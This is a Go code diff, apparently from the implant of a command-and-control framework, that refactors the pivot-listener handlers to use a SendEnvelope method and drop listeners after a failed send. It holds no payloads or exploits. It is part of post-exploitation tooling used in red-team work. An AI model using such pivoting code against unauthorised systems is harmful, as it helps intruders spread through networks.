@@ -49,10 +49,10 @@ func pivotListenersHandler(envelope *pb.Envelope, connection *transports.Connect
 		Listeners: pivots.GetListeners(),
 		Response:  &commonpb.Response{},
 	})
-	connection.Send <- &pb.Envelope{
+	connection.SendEnvelope(&pb.Envelope{
 		ID:   envelope.ID,
 		Data: data,
-	}
+	})
 }
 
 func pivotStartListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
@@ -62,38 +62,40 @@ func pivotStartListenerHandler(envelope *pb.Envelope, connection *transports.Con
 	if err != nil {
 		resp.Response.Err = err.Error()
 		data, _ := proto.Marshal(resp)
-		connection.Send <- &pb.Envelope{
+		connection.SendEnvelope(&pb.Envelope{
 			ID:   envelope.ID,
 			Data: data,
-		}
+		})
 		return
 	}
 
 	if createListener, ok := pivots.SupportedPivotListeners[req.Type]; ok {
-		listener, err := createListener(req.BindAddress, connection.Send, req.Options...)
+		listener, err := createListener(req.BindAddress, connection.SendEnvelope, req.Options...)
 		if err != nil {
 			resp.Response.Err = err.Error()
 			data, _ := proto.Marshal(resp)
-			connection.Send <- &pb.Envelope{
+			connection.SendEnvelope(&pb.Envelope{
 				ID:   envelope.ID,
 				Data: data,
-			}
+			})
 			return
 		}
 		go listener.Start()
 		pivots.AddListener(listener)
 		data, _ := proto.Marshal(listener.ToProtobuf())
-		connection.Send <- &pb.Envelope{
+		if !connection.SendEnvelope(&pb.Envelope{
 			ID:   envelope.ID,
 			Data: data,
+		}) {
+			pivots.RemoveListener(listener.ID)
 		}
 	} else {
 		resp.Response.Err = "Unsupported pivot listener type"
 		data, _ := proto.Marshal(resp)
-		connection.Send <- &pb.Envelope{
+		connection.SendEnvelope(&pb.Envelope{
 			ID:   envelope.ID,
 			Data: data,
-		}
+		})
 	}
 }
 
@@ -104,18 +106,18 @@ func pivotStopListenerHandler(envelope *pb.Envelope, connection *transports.Conn
 	if err != nil {
 		resp.Response.Err = err.Error()
 		data, _ := proto.Marshal(resp)
-		connection.Send <- &pb.Envelope{
+		connection.SendEnvelope(&pb.Envelope{
 			ID:   envelope.ID,
 			Data: data,
-		}
+		})
 		return
 	}
 	pivots.StopListener(req.ID)
 	pivots.RemoveListener(req.ID)
-	connection.Send <- &pb.Envelope{
+	connection.SendEnvelope(&pb.Envelope{
 		ID:   envelope.ID,
 		Data: []byte{},
-	}
+	})
 }
 
 func pivotPeerEnvelopeHandler(envelope *pb.Envelope, connection *transports.Connection) {
@@ -136,9 +138,9 @@ func pivotPeerEnvelopeHandler(envelope *pb.Envelope, connection *transports.Conn
 			Type:   pb.PeerFailureType_SEND_FAILURE,
 			Err:    errStr,
 		})
-		connection.Send <- &pb.Envelope{
+		connection.SendEnvelope(&pb.Envelope{
 			Type: pb.MsgPivotPeerFailure,
 			Data: data,
-		}
+		})
 	}
 }
